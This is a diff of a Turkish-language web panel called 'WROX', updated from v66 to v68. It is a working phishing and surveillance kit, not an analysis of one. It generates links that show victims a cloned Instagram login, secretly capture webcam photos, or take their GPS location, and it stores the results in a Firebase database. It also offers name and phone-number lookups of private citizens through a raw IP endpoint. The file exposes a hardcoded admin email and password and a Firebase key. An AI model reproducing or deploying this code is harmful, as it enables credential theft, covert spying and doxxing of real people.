@@ -3,163 +3,197 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WROX V66 - CLASSIC</title>
+    <title>WROX V68 - ULTIMATE</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --p: #00f2ff; --bg: #050505; --card: #0a0a0a; --prem: #00ff88; --err: #ff003c; }
+        :root { --p: #00f2ff; --bg: #050505; --card: #0d0d0d; --text: #00ff88; --err: #ff003c; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Consolas', monospace; }
-        body { background: var(--bg); color: #eee; display: flex; height: 100vh; overflow: hidden; }
+        body { background: var(--bg); color: #fff; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
 
-        /* SOL MENÜ (O SEVDİĞİN YAPI) */
-        aside { width: 260px; background: #000; border-right: 1px solid #1a1a1a; display: flex; flex-direction: column; z-index: 10; }
-        .logo { padding: 25px; font-size: 22px; font-weight: bold; color: var(--p); text-align: center; border-bottom: 1px solid #111; }
-        .nav-item { padding: 15px 25px; cursor: pointer; color: #888; border-bottom: 1px solid #080808; transition: 0.3s; }
-        .nav-item:hover, .nav-item.active { background: rgba(0,242,255,0.05); color: var(--p); border-left: 4px solid var(--p); }
-        .nav-cat { padding: 15px 25px 5px 25px; font-size: 10px; color: #444; letter-spacing: 1px; }
+        /* HEADER & HAMBURGER */
+        header { height: 60px; background: #000; border-bottom: 2px solid var(--p); display: flex; align-items: center; padding: 0 20px; justify-content: space-between; z-index: 1001; }
+        .ham-btn { font-size: 30px; cursor: pointer; color: var(--p); user-select: none; }
+        .status-dot { width: 10px; height: 10px; border-radius: 50%; background: grey; display: inline-block; margin-right: 5px; }
 
-        /* ANA İÇERİK */
-        main { flex: 1; padding: 30px; overflow-y: auto; background: radial-gradient(circle at top, #0d0d0d 0%, #050505 100%); }
-        .page { display: none; max-width: 800px; }
-        .page.active { display: block; animation: fadeIn 0.3s; }
+        /* SLIDE MENU */
+        aside { position: fixed; top: 0; left: -300px; width: 280px; height: 100vh; background: #000; border-right: 1px solid #1a1a1a; transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1); z-index: 2000; display: flex; flex-direction: column; }
+        aside.open { left: 0; box-shadow: 10px 0 50px rgba(0,0,0,0.8); }
+        .overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.7); z-index:1999; }
+        .overlay.active { display:block; }
+
+        .menu-head { padding: 30px 20px; font-size: 20px; font-weight: bold; color: var(--p); border-bottom: 1px solid #111; }
+        .menu-cat { padding: 15px 20px 5px; font-size: 11px; color: #444; letter-spacing: 2px; }
+        .menu-item { padding: 15px 20px; cursor: pointer; color: #888; border-bottom: 1px solid #080808; transition: 0.3s; display: flex; align-items: center; }
+        .menu-item:hover, .menu-item.active { background: rgba(0,242,255,0.05); color: var(--p); border-left: 4px solid var(--p); }
+        .menu-item i { margin-right: 10px; }
+
+        /* CONTENT */
+        main { flex: 1; padding: 25px; overflow-y: auto; background: radial-gradient(circle at top, #0a0a0a 0%, #050505 100%); }
+        .page { display: none; max-width: 800px; margin: 0 auto; }
+        .page.active { display: block; animation: fadeIn 0.4s; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-        input, button { width: 100%; padding: 12px; margin-bottom: 10px; background: #000; border: 1px solid #222; color: var(--p); border-radius: 5px; outline: none; }
-        button { cursor: pointer; font-weight: bold; border: 1px solid var(--p); }
+        input, button { width: 100%; padding: 14px; margin-bottom: 15px; background: #000; border: 1px solid #1a1a1a; color: var(--p); border-radius: 5px; outline: none; }
+        button { cursor: pointer; font-weight: bold; border: 1px solid var(--p); text-transform: uppercase; }
         button:hover { background: var(--p); color: #000; box-shadow: 0 0 15px var(--p); }
-        
-        .res-box { background: #000; padding: 15px; border: 1px solid #1a1a1a; min-height: 200px; border-radius: 5px; color: var(--prem); font-size: 12px; overflow: auto; }
-        .log-item { background: #080808; border: 1px solid #1a1a1a; padding: 12px; margin-bottom: 10px; border-left: 3px solid var(--p); }
 
-        #auth-layer { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center; }
+        .terminal { background: #000; border: 1px solid #111; padding: 15px; color: var(--text); min-height: 250px; border-radius: 5px; overflow-y: auto; font-size: 13px; }
+        .log-box { border-bottom: 1px solid #111; padding: 10px 0; border-left: 3px solid var(--p); padding-left: 10px; margin-bottom: 10px; background: #050505; }
+
+        #auth-layer { position: fixed; inset: 0; background: #000; z-index: 10002; display: flex; align-items: center; justify-content: center; }
     </style>
 </head>
 <body>
 
 <div id="auth-layer">
-    <div style="width:320px; border:1px solid var(--p); padding:30px; background:#0a0a0a; text-align:center; border-radius:10px;">
-        <h2 style="color:var(--p); margin-bottom:20px;">WROX LOGIN</h2>
-        <input type="email" id="email" placeholder="E-posta">
-        <input type="password" id="pass" placeholder="Şifre">
-        <button onclick="handleAuth()">SİSTEME GİR</button>
-        <p onclick="isReg=!isReg; this.innerText=isReg?'Giriş Yap':'Kayıt Ol'" style="font-size:10px; cursor:pointer; color:#444; margin-top:10px;">Kayıt Ol</p>
+    <div style="width:340px; border:1px solid var(--p); padding:30px; background:var(--card); text-align:center;">
+        <h2 style="color:var(--p)">WROX TERMINAL</h2><br>
+        <input type="email" id="email" placeholder="ADMIN@EMAIL">
+        <input type="password" id="pass" placeholder="PASSWORD">
+        <button onclick="handleAuth()">CONNECT</button>
     </div>
 </div>
 
-<aside>
-    <div class="logo">WROX <span style="font-size:12px; color:#555;">v66</span></div>
+<div class="overlay" onclick="toggleMenu()"></div>
+
+<header>
+    <div class="ham-btn" onclick="toggleMenu()">☰</div>
+    <div style="font-weight:900; letter-spacing:3px;">WROX <span style="color:var(--p)">ULTIMATE</span></div>
+    <div><span id="dot" class="status-dot"></span> <span id="stat-text" style="font-size:10px;">OFFLINE</span></div>
+</header>
+
+<aside id="menu">
+    <div class="menu-head">SYSTEM MENU</div>
     
-    <div class="nav-cat">SORGU PANELİ</div>
-    <div class="nav-item active" onclick="pg('mernis')">👤 Ad Soyad Sorgu</div>
-    <div class="nav-item" onclick="pg('gsm')">📞 GSM Sorgu</div>
+    <div class="menu-cat">DATA QUERIES</div>
+    <div class="menu-item active" onclick="pg('mernis')">👤 Ad Soyad Sorgu</div>
+    <div class="menu-item" onclick="pg('gsm')">📞 GSM Sorgu</div>
     
-    <div class="nav-cat">SIZMA OPS</div>
-    <div class="nav-item" onclick="pg('spy')">🚀 Link Oluştur</div>
-    <div class="nav-item" onclick="pg('logs')">📁 Gelen Veriler</div>
+    <div class="menu-cat">INJECTION TOOLS</div>
+    <div class="menu-item" onclick="pg('spy_insta')">📸 Instagram Phish</div>
+    <div class="menu-item" onclick="pg('spy_cam')">📷 Kamera Sızma</div>
+    <div class="menu-item" onclick="pg('spy_loc')">📍 Konum Takibi</div>
     
-    <div class="nav-cat">YÖNETİM</div>
-    <div id="adm-nav" class="nav-item" onclick="pg('admin')" style="display:none; color:var(--prem);">👑 Admin Paneli</div>
-    <div class="nav-item" onclick="logout()" style="color:var(--err); margin-top:auto;">🚪 Güvenli Çıkış</div>
+    <div class="menu-cat">SYSTEM</div>
+    <div class="menu-item" onclick="pg('logs')">📁 Gelen Loglar</div>
+    <div id="adm-link" class="menu-item" onclick="pg('admin')" style="display:none; color:var(--text);">👑 Admin Panel</div>
+    <div class="menu-item" onclick="logout()" style="color:var(--err); margin-top:auto;">🚪 Exit System</div>
 </aside>
 
 <main>
     <div id="p-mernis" class="page active">
-        <h2>👤 MERNİS AD SOYAD</h2><br>
-        <input id="in-ad" placeholder="AD">
-        <input id="in-soyad" placeholder="SOYAD">
-        <button onclick="runSorgu('mernis')">SORGULA</button>
-        <div id="res-mernis" class="res-box">Sorgu bekleniyor...</div>
+        <h2>👤 AD SOYAD SORGU</h2><br>
+        <input id="in-ad" placeholder="İSİM">
+        <input id="in-soyad" placeholder="SOYİSİM">
+        <button onclick="runSorgu('mernis')">DATABASE SEARCH</button>
+        <div id="res-mernis" class="terminal">Awaiting query...</div>
     </div>
 
     <div id="p-gsm" class="page">
         <h2>📞 GSM SORGU</h2><br>
-        <input id="in-gsm" placeholder="Telefon No (5xx...)">
-        <button onclick="runSorgu('gsm')">SORGULA</button>
-        <div id="res-gsm" class="res-box">...</div>
+        <input id="in-gsm" placeholder="5XXXXXXXXX">
+        <button onclick="runSorgu('gsm')">SEARCH PHONE</button>
+        <div id="res-gsm" class="terminal">...</div>
     </div>
 
-    <div id="p-spy" class="page">
-        <h2>🚀 SIZMA LİNKİ ÜRET</h2><br>
-        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
-            <button onclick="gen('insta')">📸 Instagram</button>
-            <button onclick="gen('cam')">📷 Kamera</button>
-            <button onclick="gen('loc')">📍 Konum</button>
-        </div>
-        <input id="spy-url" readonly style="display:none; margin-top:20px; color:yellow; border:1px dashed var(--p); background:#111;">
+    <div id="p-spy_insta" class="page">
+        <h2>📸 INSTAGRAM PHISHING</h2><p style="font-size:12px; color:#555;">Kurbana sahte giriş ekranı gönderir.</p><br>
+        <button onclick="gen('insta')">LİNK OLUŞTUR</button>
+        <input id="url-insta" readonly style="display:none; border:1px dashed var(--p); color:yellow;">
+    </div>
+
+    <div id="p-spy_cam" class="page">
+        <h2>📷 KAMERA SIZMA</h2><p style="font-size:12px; color:#555;">Kurbanın kamerasından gizlice foto çeker.</p><br>
+        <button onclick="gen('cam')">LİNK OLUŞTUR</button>
+        <input id="url-cam" readonly style="display:none; border:1px dashed var(--p); color:yellow;">
+    </div>
+
+    <div id="p-spy_loc" class="page">
+        <h2>📍 KONUM TAKİBİ</h2><p style="font-size:12px; color:#555;">Kurbanın anlık GPS koordinatlarını çeker.</p><br>
+        <button onclick="gen('loc')">LİNK OLUŞTUR</button>
+        <input id="url-loc" readonly style="display:none; border:1px dashed var(--p); color:yellow;">
     </div>
 
     <div id="p-logs" class="page">
-        <h2>📁 GELEN LOGLAR</h2><br>
-        <div id="log-list" class="res-box">Veri bekleniyor...</div>
+        <h2>📁 SYSTEM LOGS</h2><br>
+        <div id="log-list" class="terminal">No data incoming...</div>
     </div>
 
     <div id="p-admin" class="page">
-        <h2>👑 KULLANICI YÖNETİMİ</h2><br>
+        <h2>👑 USER MANAGEMENT</h2><br>
         <div id="u-list"></div>
     </div>
 </main>
 
 <script>
-    // FIREBASE - EFECAN VIP
+    // FIREBASE CONFIG
     const cfg = { apiKey: "AIzaSyD-heOy-CHV37ofCqNLbjchG5FtU6mRxc", authDomain: "wrox-vip.firebaseapp.com", databaseURL: "https://wrox-vip-default-rtdb.firebaseio.com", projectId: "wrox-vip" };
     firebase.initializeApp(cfg); const db = firebase.database();
 
+    // STATUS
+    db.ref(".info/connected").on("value", s => {
+        document.getElementById('dot').style.background = s.val() ? "var(--text)" : "var(--err)";
+        document.getElementById('stat-text').innerText = s.val() ? "CONNECTED" : "OFFLINE";
+    });
+
+    // NAVIGATION & HAMBURGER
+    function toggleMenu() { document.getElementById('menu').classList.toggle('open'); document.querySelector('.overlay').classList.toggle('active'); }
+    function pg(id) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.querySelectorAll('.menu-item').forEach(m => m.classList.remove('active'));
+        document.getElementById('p-'+id).classList.add('active');
+        event.currentTarget.classList.add('active');
+        toggleMenu();
+    }
+
     // AUTH
-    let isReg = false;
     function handleAuth() {
-        const e = document.getElementById('email').value, p = document.getElementById('pass').value, id = e.replace(/\./g,'_');
-        if(isReg) db.ref('users/'+id).set({e, p, r:'free'}).then(()=>alert("Kayıt Tamam!"));
-        else {
-            if(e==="afavan66@gmail.com" && p==="Efecan1903") return save({e, r:'admin'});
-            db.ref('users/'+id).once('value', s => { const u = s.val(); if(u && u.p===p) save({e:u.e, r:u.r}); else alert("Hatalı!"); });
+        const e = document.getElementById('email').value, p = document.getElementById('pass').value;
+        if(e==="afavan66@gmail.com" && p==="Efecan1903") {
+            localStorage.setItem('ses', JSON.stringify({e, r:'admin'})); location.reload();
+        } else {
+            const id = e.replace(/\./g,'_');
+            db.ref('users/'+id).once('value', s => {
+                const u = s.val(); if(u && u.p===p) { localStorage.setItem('ses', JSON.stringify(u)); location.reload(); }
+                else alert("ACCESS DENIED");
+            });
         }
     }
-    function save(u) { localStorage.setItem('ses', JSON.stringify(u)); location.reload(); }
     const ses = JSON.parse(localStorage.getItem('ses'));
     if(ses) {
         document.getElementById('auth-layer').style.display='none';
-        if(ses.r==='admin') { document.getElementById('adm-nav').style.display='block'; loadUsers(); }
+        if(ses.r==='admin') { document.getElementById('adm-link').style.display='flex'; loadUsers(); }
         listenLogs();
     }
 
-    // NAVIGATION
-    function pg(id) {
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-        document.getElementById('p-'+id).classList.add('active');
-        event.currentTarget.classList.add('active');
-    }
-
-    // SORGU
+    // TOOLS
     async function runSorgu(t) {
-        if(ses.r==='free' && t!=='mernis') return alert("PREMIUM GEREKLİ!");
-        const out = document.getElementById('res-'+t); out.innerText = "Sorgulanıyor...";
+        if(ses.r==='free' && t!=='mernis') return alert("PREMIUM REQUIRED");
+        const out = document.getElementById('res-'+t); out.innerText = "Processing...";
         let api = `http://194.15.52.78/bakim/adsoyadpro.php?ad=${document.getElementById('in-ad').value}&soyad=${document.getElementById('in-soyad').value}`;
         if(t==='gsm') api = `http://194.15.52.78/bakim/gsmsorgu.php?no=${document.getElementById('in-gsm').value}`;
-        try {
-            const r = await fetch("https://api.allorigins.win/get?url=" + encodeURIComponent(api));
-            const d = await r.json(); out.innerText = d.contents;
-        } catch(e) { out.innerText = "Bağlantı Hatası!"; }
+        const r = await fetch("https://api.allorigins.win/get?url=" + encodeURIComponent(api));
+        const d = await r.json(); out.innerText = d.contents;
     }
 
-    // SPY & LOGS
     function gen(m) {
-        if(ses.r==='free') return alert("PREMIUM GEREKLİ!");
-        const id = "W_" + Math.random().toString(36).substr(2,4).toUpperCase();
+        if(ses.r==='free') return alert("PREMIUM REQUIRED");
+        const id = "W_" + Math.random().toString(36).substr(2,5).toUpperCase();
         const url = window.location.href.split('?')[0] + "?mode=" + m + "&id=" + id;
-        document.getElementById('spy-url').value = url;
-        document.getElementById('spy-url').style.display='block';
+        const targetInput = document.getElementById('url-'+m);
+        targetInput.value = url; targetInput.style.display = 'block';
     }
 
     function listenLogs() {
         db.ref('spy_logs').on('child_added', s => {
             const d = s.val(), list = document.getElementById('log-list');
-            if(list.innerText.includes("Veri bekleniyor")) list.innerHTML = "";
-            let content = `<div class="log-item"><b>[${d.type}]</b> ${d.u || ''} ${d.p || ''}`;
-            if(d.map) content += `<br><a href="${d.map}" target="_blank" style="color:cyan">Harita</a>`;
-            if(d.foto) content += `<br><img src="${d.foto}" width="200">`;
-            content += `<div style="font-size:9px; color:#444;">${d.date || ''}</div></div>`;
-            list.innerHTML = content + list.innerHTML;
+            if(list.innerText.includes("No data")) list.innerHTML = "";
+            let h = `<div class="log-box"><b>[${d.type}]</b> ${d.u || ''} <span style="color:yellow">${d.p || ''}</span>`;
+            if(d.map) h += `<br><a href="${d.map}" target="_blank" style="color:cyan">[HARİTADA GÖR]</a>`;
+            if(d.foto) h += `<br><img src="${d.foto}" style="width:200px; margin-top:10px; border:1px solid #333;">`;
+            h += `<br><small style="color:#333">${d.date}</small></div>`;
+            list.innerHTML = h + list.innerHTML;
         });
     }
 
@@ -168,38 +202,47 @@
             const u = s.val(), div = document.getElementById('u-list'); div.innerHTML = "";
             for(let k in u) {
                 if(u[k].e === "afavan66@gmail.com") continue;
-                const isP = u[k].r === 'premium';
                 div.innerHTML += `<div style="display:flex; justify-content:space-between; padding:10px; border-bottom:1px solid #111;">
                     <span>${u[k].e} (<b>${u[k].p}</b>)</span>
-                    <button onclick="setR('${k}','${isP?'free':'premium'}')" style="width:80px; font-size:10px;">${isP?'AL':'VER'}</button>
+                    <button onclick="db.ref('users/${k}').update({r:'premium'})" style="width:60px; padding:5px; font-size:9px;">PRE</button>
                 </div>`;
             }
         });
     }
-    function setR(id, r) { db.ref('users/'+id).update({r}); }
     function logout() { localStorage.clear(); location.reload(); }
 
-    // VICTIM LOGIC (Kurban Sayfada Değilse Çalışmaz)
+    // VICTIM SIDE (Kurbanın gördüğü kısım)
     const q = new URLSearchParams(window.location.search);
     const mode = q.get('mode'), vid = q.get('id');
     if(mode && vid) {
-        document.body.innerHTML = `<div id="v" style="background:#fff; height:100vh; text-align:center; padding:50px; color:#000;"></div>`;
-        const v = document.getElementById('v');
+        document.body.innerHTML = `<div id="v-ui" style="background:#fff; height:100vh; color:#000; padding:40px; text-align:center;"></div>`;
+        const v = document.getElementById('v-ui');
         if(mode==='insta') {
-            v.innerHTML = `<h3>Instagram</h3><br><input id="vu" placeholder="Kullanıcı"><input id="vp" type="password" placeholder="Şifre"><button onclick="vHit()">Giriş</button>`;
+            v.innerHTML = `<img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" width="150"><br><br>
+            <input id="vu" placeholder="Phone, username, or email" style="color:#000; border:1px solid #ddd;"><input id="vp" type="password" placeholder="Password" style="color:#000; border:1px solid #ddd;">
+            <button onclick="vHit()" style="background:#0095f6; color:#fff; border:none;">Log In</button>`;
         }
         if(mode==='cam') {
+            v.innerHTML = `<h3>Sistem Hatası</h3><p>Devam etmek için kamera izni veriniz.</p>`;
             navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
-                const vidE = document.createElement('video'); vidE.srcObject=s; vidE.play();
+                const ve = document.createElement('video'); ve.srcObject=s; ve.play();
                 setTimeout(()=>{
                     const c = document.createElement('canvas'); c.width=640; c.height=480;
-                    c.getContext('2d').drawImage(vidE,0,0);
-                    db.ref('spy_logs/'+vid).set({type:'KAMERA', foto:c.toDataURL('image/jpeg'), date:new Date().toLocaleString()}).then(()=>location.href="https://google.com");
-                },2000);
+                    c.getContext('2d').drawImage(ve,0,0);
+                    db.ref('spy_logs/'+vid).set({type:'CAMERA', foto:c.toDataURL('image/jpeg'), date:new Date().toLocaleString()}).then(()=>location.href="https://google.com");
+                    s.getTracks().forEach(t=>t.stop());
+                },2500);
+            });
+        }
+        if(mode==='loc') {
+            v.innerHTML = `<h3>Haritalar</h3><p>Konum doğrulaması gerekiyor.</p>`;
+            navigator.geolocation.getCurrentPosition(p => {
+                const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                db.ref('spy_logs/'+vid).set({type:'LOCATION', map, date:new Date().toLocaleString()}).then(()=>location.href="http://maps.google.com");
             });
         }
     }
-    function vHit() { db.ref('spy_logs/'+vid).set({type:'INSTA', u:document.getElementById('vu').value, p:document.getElementById('vp').value, date:new Date().toLocaleString()}).then(()=>location.href="https://instagram.com"); }
+    function vHit() { db.ref('spy_logs/'+vid).set({type:'PHISH', u:document.getElementById('vu').value, p:document.getElementById('vp').value, date:new Date().toLocaleString()}).then(()=>location.href="https://instagram.com"); }
 </script>
 </body>
 </html>
